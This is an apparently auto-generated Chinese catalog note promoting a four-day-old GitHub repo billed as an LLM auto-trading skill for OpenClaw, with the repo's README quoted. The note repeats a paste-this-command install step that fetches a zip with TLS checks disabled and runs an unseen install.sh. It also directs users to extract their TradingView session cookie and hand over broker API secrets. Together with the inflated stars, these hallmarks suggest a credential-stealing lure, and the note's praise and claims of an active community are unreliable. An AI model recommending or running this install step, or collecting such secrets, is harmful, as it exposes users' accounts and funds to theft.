---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 324
stars_per_day: 81
forks: 1
open_issues: 0
created: 2026-03-06
pushed_at: 2026-03-09
first_seen: 2026-03-10
week: "2026-W11"
month: "2026-03"
category: "AI/ML"
release_tag: ""
install_complexity: "easy"
status: to-review
my_rating: 0
last_reviewed: 2026-03-10
tags:
  - github
  - "category/ai_ml"
  - "lang/python"
  - easy_install
  - "topic/ai_auto_trading"
  - "topic/ai_trading"
  - "topic/ai_trading_bots"
  - "topic/al_trading"
  - "topic/bot_trading"
aliases:
  - "TradingView-Claw"
  - "helenigtxu/TradingView-Claw"
  - "一個基於 TradingView 的自動交易工具，支援技術分析和交易執行。"
---

# TradingView-Claw

**324** stars · **81** stars/天 · 建立 4 天前 · Python · MIT

`個人專案` `easy-install`

> [!summary] 一句話摘要
> 一個基於 TradingView 的自動交易工具，支援技術分析和交易執行。

> [!info] 速覽
> **安裝難度** Easy · **專案狀態** Brand New · **熱度** Growing (81 stars/day)
> **適合** 希望利用技術分析進行自動化交易的交易者，特別是量化交易者。
> **一句話重點** TradingView-Claw 的設計強調自動化和技術分析，讓交易者能夠更有效率地捕捉市場機會。

> [!abstract] 核心創新
> TradingView-Claw 提供了一個基於 LLM 的技術分析工具，能夠自動執行交易並追蹤持倉。

## 專案簡介

TradingView-Claw 是一個整合 TradingView 的自動交易工具，允許用戶根據技術信號執行交易並追蹤持倉。它提供了完整的交易能力，通過與經紀商的 API 進行集成，實現自動化交易。使用者可以透過簡單的指令來獲取市場數據、執行買賣操作，並且能夠使用 LLM 驅動的技術分析來識別高信心的交易信號。與其他交易工具相比，TradingView-Claw 的一大特色是其信號篩選系統，僅接受統計上有意義的信號，過濾掉噪音和弱相關性。這使得用戶能夠更專注於高潛力的交易機會，並提高交易的成功率。這個專案對於希望自動化交易流程的交易者來說，提供了一個強大的工具。

**技術棧**：`Python` · `Shell`

## 重點功能

- 技術分析功能 — 使用 `tvclaw charts` 指令獲取市場趨勢和指標。
- 自動交易 — 使用 `tvclaw buy` 和 `tvclaw sell` 指令進行交易執行。
- 持倉追蹤 — 使用 `tvclaw positions` 指令查看當前持倉和損益。
- 信號發現 — 使用 `tvclaw signal scan` 指令掃描市場信號，篩選高信心的交易機會。
- 經紀商連接 — 一次性設置 API 連接，支持多種經紀商。

## 快速開始

1. 安裝 TradingView-Claw
```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
```
2. 配置環境變數
```bash
在 openclaw.json 中添加 TradingView 和經紀商的 API 密鑰
```
3. 連接經紀商帳戶
```bash
uv run python scripts/tvclaw.py account connect
```

## 程式碼範例

```bash
uv run python scripts/tvclaw.py buy AAPL 500
```

## 為什麼值得關注

> [!tip] 爆紅原因
> TradingView-Claw 的開發者對於自動交易和技術分析有深入的理解，並且專注於提供一個易於使用的工具來滿足交易者的需求。隨著自動化交易的興起，這個專案提供了具體的解決方案，並且其基於 LLM 的分析能力讓它在同類工具中脫穎而出。

## 適合誰使用

**目標受眾**：希望利用技術分析進行自動化交易的交易者，特別是量化交易者。

> [!example] 使用場景
> - 量化交易者用它來自動執行交易策略，因為其信號篩選系統能夠提高交易成功率，降低風險。
> - 新手交易者用它來學習市場趨勢，因為它提供了簡單的指令和即時的市場數據，幫助他們做出明智的決策。
> - 資深交易者用它來進行高頻交易，因為其快速的執行能力和技術分析工具能夠捕捉短期機會。

## 架構分析

TradingView-Claw 採用微服務架構，使用 Python 處理交易邏輯，並透過 API 與經紀商進行交互。用戶輸入 → 交易指令處理 → 執行交易。關鍵技術決策包括使用 LLM 進行信號分析，並在本地保存持倉數據。目錄結構中，主要的執行腳本為 tvclaw.py。

## 優缺點分析

> [!success] 優點
> - 提供強大的技術分析功能，幫助用戶做出明智的交易決策。
> - 自動化交易流程，減少人工操作的需求。
> - 支持多種經紀商，靈活性高。

> [!danger] 缺點
> - 僅供教育用途，未經審核的代碼風險需自行承擔。
> - 需要用戶自行管理 API 密鑰，增加安全風險。
> - 不支持所有經紀商，限制了使用範圍。

> [!warning] 注意事項
> - 僅供教育和實驗用途，未經審核。
> - 需要用戶自行管理 API 密鑰的安全性。
> - 不支持所有經紀商，僅限於已集成的經紀商。

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 1 |
| Open Issues | 0 |
| 最後推送 | 2026-03-09 |
| 建立日期 | 2026-03-06 |
| Repo 大小 | 90 KB |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 3 |

## 社群與生態

**社群活躍度**：社群活躍，持續有更新和改進。

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on macOS — one command
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect broker/exchange API (one-time setup)
> 
> ### Signal Discovery
> 
> * `tvclaw signal scan` — Scan trending symbols for trade signals
> * `tvclaw signal scan --query "topic"` — Scan symbols matching a query
> * `tvclaw signal analyze  ` — Compare signal strength between two symbols
> 
> Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.
> 
> **Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)
> 
> ---
> 
> ## Quick Start
> 
> ### 1. Install
> 
> **macOS (recommended) — one command:**
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> **Manual install:**
> 
> ```bash
> cp -r TradingView-Claw ~/.openclaw/skills/
> cd ~/.openclaw/skills/TradingView-Claw
> uv sync
> ```
> 
> **Via ClawHub:**
> 
> ```bash
> clawhub install tvclaw
> cd ~/.openclaw/skills/tvclaw
> uv sync
> ```
> 
> ---
> 
> ### 2. Configure Environment Variables
> 
> Add the following to your `openclaw.json` under `skills.entries.tvclaw.env`:
> 
> ```json
> "tvclaw": {
>   "enabled": true,
>   "env": {
>     "TRADINGVIEW_SESSION": "your_tradingview_session_token",
>     "BROKER_API_KEY": "your_broker_api_key",
>     "BROKER_API_SECRET": "your_broker_api_secret",
>     "OPENROUTER_API_KEY": "sk-or-v1-..."
>   }
> }
> ```
> 
> **Where to get the keys:**
> 
> * **TradingView session** — Log into TradingView, open DevTools → Application → Cookies → copy `sessionid`
> * **Broker API key** — From your broker dashboard (supports Alpaca, IBKR, Binance, Bybit)
> * **OpenRouter API key** — [Create key at OpenRouter](https://openrouter.ai/settings/keys)
> 
> **Security warning:** Keep only small amounts in your trading account. Use sub-accounts with limited permissions where possible.
> 
> ---
> 
> ### 3. First-Time Setup (required for live trading)
> 
> Before your first trade, connect and verify your broker connection:
> 
> ```bash
> uv run python scripts/tvclaw.py account connect
> ```
> 
> This verifies API credentials and sets account permissions. Only needs to be done once per account.
> 
> ---
> 
> ### 4. Run Commands
> 
> ```bash
> # Browse charts
> uv run python scripts/tvclaw.py charts trending
> uv run python scripts/tvclaw.py charts search "AAPL"
> 
> # Find trading signals
> uv run python scripts/tvclaw.py signal scan --limit 10
> 
> # Check account and trade
> uv run python scripts/tvclaw.py account status
> uv run python scripts/tvclaw.py buy AAPL 500
> ```
> 
> ---
> 
> ## Example Prompt

## 延伸閱讀

相關概念：[[量化交易]] · [[自動化交易]] · [[技術分析]]

[GitHub](https://github.com/helenigtxu/TradingView-Claw)

## 相關收錄

> [!note]- 同分類的其他專案
> ```dataview
> LIST
> FROM "Repos"
> WHERE category = "AI/ML" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> LIMIT 8
> ```

---

## 個人筆記

> [!question]+ 快速評估（第一次看時填寫）
> _填寫後更新 frontmatter 的 `my_rating` 和 `status` 欄位_
> 
> **跟我的工作相關嗎？** 是 / 否 / 間接相關
> **值得花時間試用嗎？** 是 / 以後再說 / 不需要
> **第一印象**：_一句話_

> [!success]- 深度評估（試用後填寫）
> 
> | 項目 | 分數 (1-5) | 備註 |
> | --- | :---: | --- |
> | 實用性 | /5 | |
> | 技術新穎性 | /5 | |
> | 文件品質 | /5 | |
> | 社群活躍度 | /5 | |
> | 上手難度 | /5 | 1=很難 5=很簡單 |
> 
> **成熟度**：早期 / 可用 / 穩定
> **總評**：_整體評價、跟其他工具的比較、推薦給誰..._

### 試用記錄

> [!example]- 試用 #1
> 試用日期 :: 
> 試用版本 :: 
> 安裝過程 :: _順利 / 遇到問題（描述）_
> 實際效果 :: _達到預期 / 不如預期（原因）_
> 決定 :: _繼續使用 / 暫時擱置 / 放棄（原因）_

> [!question]- 待研究的問題
> _記下看完後還沒有答案的問題，未來回來補充_
> 
> - [ ] 

### 採用判斷

> [!tip]- 什麼時候該用 / 不該用
> **該用的情況**：
> - 
> 
> **不該用的情況**：
> - 

### 想法與筆記

_隨時記錄想法、發現、跟其他工具的比較..._
_重點：寫下你的主觀判斷（為什麼好/不好），而不只是功能列表_

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`

## 出現記錄

- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
